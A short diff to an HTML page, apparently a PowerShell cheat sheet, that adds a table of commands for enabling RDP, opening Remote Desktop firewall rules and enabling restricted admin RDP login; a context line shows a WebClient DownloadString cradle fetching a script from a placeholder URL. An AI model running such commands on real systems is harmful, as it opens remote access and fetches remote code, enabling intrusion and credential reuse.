@@ -654,6 +654,25 @@ layout: default
                     System.Net.Webclient).DownloadString(&#039;https://website.com/url/to/file.ps1&#039;)</li>
             </td>
         </tr>
+        <tr>
+            <td>Enable RDP</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Enable RDP service</td>
+                        <td>Set-ItemProperty -Path &apos;HKLM:\System\CurrentControlSet\Control\Terminal Server&apos; -name &quot;fDenyTSConnections&quot; -value 0</td>
+                    </tr>
+                    <tr>
+                        <td>Set firewall rules</td>
+                        <td>Enable-NetFirewallRule -DisplayGroup "Remote Desktop"</td>
+                    </tr>
+                    <tr>
+                        <td>Enable restricted admin RDP login</td>
+                        <td>New-ItemProperty -Path &apos;HKLM:\System\CurrentControlSet\Control\Lsa&apos;  -Name &apos;DisableRestrictedAdmin&apos; -Value 0 -PropertyType DWORD</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
     </table>
 
     <hr>
